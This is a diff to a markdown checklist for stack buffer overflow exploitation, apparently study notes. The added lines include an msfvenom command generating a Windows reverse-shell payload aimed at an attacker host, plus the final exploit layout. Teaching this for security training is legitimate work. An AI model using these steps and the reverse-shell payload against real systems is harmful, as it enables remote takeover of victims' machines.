@@ -12,8 +12,8 @@ msf-pattern_create -l { Ammount of characters to be generated }
 ```
 - [ ] Locate space for the shellcode - After the EIP or Before it
 - [ ] Find bad characters 
-> 0x00 should always be excluded from the valid characters
-- [ ] Find a JMP ESP instruction in the dll's ( JMP ESP opcode - *FFE4* )
+> **0x00** should always be excluded from the valid characters
+- [ ] Find a JMP ESP instruction in the dll's ( JMP ESP opcode - **FFE4** )
 > DEP and ASLR should be disabled
 > There shouldn't be any bad characters in the base address of the modules
 ```
@@ -21,3 +21,10 @@ msf-pattern_create -l { Ammount of characters to be generated }
 ```
 - [ ] Change the EIP to the the JMP ESP instruction from the previous step
 > Note that the format is Little Endian, therefore the address should be in reverse order: 0x10090c83 --> \x83\x0c\x09\x10
+- [ ] Generate a shellcode 
+```
+msfvenom -l payloads
+msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=attacker-port EXITFUNC=thread -f c -b "\x00\x0a\x26..." 
+```
+- [ ] Final exploit should look like: **filler + eip + offset + nops + shellcode**
+> *Thanks for watching!*
